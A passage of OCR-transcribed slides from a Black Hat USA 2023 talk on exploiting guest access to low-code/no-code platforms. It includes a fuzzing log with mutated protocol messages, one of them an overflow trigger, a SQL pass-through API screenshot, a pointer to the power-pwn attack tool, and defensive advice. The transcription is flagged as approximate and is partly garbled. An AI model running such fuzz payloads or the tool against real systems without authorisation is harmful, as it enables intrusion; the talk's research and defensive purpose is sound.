get, and delete on rows in a table.
Schemes
HTTPS v
/#£47194e357e459b8756a5F43f59ccc6/$metadata.json/datasets Get datasets metadata
```

## Slide 181

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 71/100 on the text kept, 62/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
FUZZ Example

pd -> cp: b'53e508000440d296' (original:b'53e508000440d29653e508000440d29653e508000440d296') applied mutation remove_payload
pd -> cp: b'53e508000440d296'
pd -> cp: b'53e5100004b7d29653e50800044041cb' (original:b'53e508000440d29653e508000440d296') applied mutation random_message_code
pd -> cp: b'53e5100004b7d29653e50800044041cb'
pd -> cp: b'b8e510000440d29653e50800044045e9' (original:b'53e508000440d29653e508000440d296') applied mutation random_som
pd -> cp: b'b8e510000440d29653e50800044045e9'
pd -> cp: b'53e510000440d29653e50800044081ae' (original:b'53e508000440d29653e508000440d296') applied mutation random_size
pd -> cp: b'53e510000440d29653e50800044081ae'
pd -> cp: b'53e518000040d29653e508000440d29653e50800044098' (original:b'53e508000440d29653e508000440d29653e508000440d296') applied mutation invert_control_crc
pd -> cp: b'53e518000040d29653e508000440d29653e50800044098'
pd -> cp: b'53e510000401d29653e50800044079da' (original:b'53e508000440d29653e508000440d296') applied mutation message_code_all
pd -> cp: b'53e510000401d29653e50800044079da'
pd -> cp: b'53e588000450ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff56d2' (original:b'53e508000440d29653e508000440d296') applied mutation trigger_overflow
pd -> cp: b'53e588000450ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff56d2'
```

## Slide 182

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SqlPassThroughNativeQuery
Parameters Try it out
Name Description
dataset *
. dataset
string
(path)
language *
(path)
query *
object
(body)
Example Value Model
{
“actualParameters": {
“additionalProp1":
“additionalProp2":
“additionalProp3":
“additionalProp1
“additionalProp2":
“additionalProp3":
: “string”
Parameter content type
```

## Slide 183

Find us at BlackHat Arsenal!

PowerGuest: AAD Guest Exploitation Beyond Enumeration

+ on GitHub! github.com/mbrg/power-pwn

#BHUSA @BlackHatEvents @mbrg0

## Slide 184

# Defense

@mbrg0

#BHUSA @BlackHatEvents

## Slide 185

State of the exploit Strong collab w/ MSRC

• Working together to fix issues • Clarifying mitigation • Currently no vulns

#BHUSA @BlackHatEvents

## Slide 186

### Serverless LCNC

We must own our side of the Shared Responsibility Model

Data
Biz logic
Access

Data
Biz logic

#### Access

Code Code Identity Identity Runtime Runtime … …

Code Identity Runtime

Customer

Platform

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 187

### LCNC

Data

Biz logic

Customer

#### Access

Code

Identity

Runtime

Platform

…

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 188

## Platforms have to step up

#### Data Biz logic Access

Code
Identity
Runtime

##### Customer

##### Platform

Every SaaS is a Low-Code/No-Code platform today. They need to own the code running on their platforms, in addition to the rest of the Shared Responsibility Model.

…

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 189

## Sure, let business users build they own. What could go wrong?

Data
Biz logic

##### Customer

#### Access

Code

#### Identity Runtime

Platform

…

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 190

## Sure, let business users build they own. What could go wrong?

#### Data

#### Biz logic

#### Access

#### Code

##### Customer

- Are apps moving data outside of the corp boundary?

- • Are users over-sharing data?

- Are we allowing external access?

- Are we properly handling secrets and sensitive data?

- • Do apps have business logic vulns?

#### Identity Runtime

##### Platform

-

- …

…

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 191

## Sure, let business users build they own. What could go wrong?

#### Data

#### Biz logic

#### Access

#### Code

##### Customer

- Are apps moving data outside of the corp boundary?

- • Are users over-sharing data?

- Are we allowing external access?

- Are we properly handling secrets and sensitive data?

- • Do apps have business logic vulns?

#### Identity Runtime

##### Platform

-

- …

**Who owns AppSec for apps built by business users?**

…

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 192

## Protect your org!

### Build secure apps

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 193

## Protect your org!

### Build secure apps 1. Don’t overshare

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 194

## Protect your org!

### Build secure apps 1. Don’t overshare 2. OWASP LCNC Top 10

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 195

## Protect your org!

Build secure apps 1. Don’t overshare 2. OWASP LCNC Top 10 Harden your env

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 196

## Protect your org!

### Build secure apps

### 1. Don’t overshare 2. OWASP LCNC Top 10 Harden your env 3. Secure configs

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 197

## Protect your org!

### Build secure apps

1. Don’t overshare 2. OWASP LCNC Top 10 Harden your env 3. Secure configs 4. AppSec

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 198

## Protect your org!

### Build secure apps

1. Don’t overshare 2. OWASP LCNC Top 10 Harden your env 3. Secure configs 4. AppSec Hack your env

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 199

## Protect your org!

### Build secure apps

1. Don’t overshare 2. OWASP LCNC Top 10 Harden your env 3. Secure configs 4. AppSec Hack your env 6. powerpwn

#BHUSA @BlackHatEvents **Code, links and details** ➔ **bit.ly/mbrg-bhusa23 & @mbrg0**

## Slide 200

# All You Need Is Guest

Michael Bargury @mbrg0 Zenity

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
AUGUST 9-10, ©0253
BRIEFINGS
All You Need Is Guest
Michael Bargury @mbrgO
Zenity
#BHUSA @BlackHatEvents
```
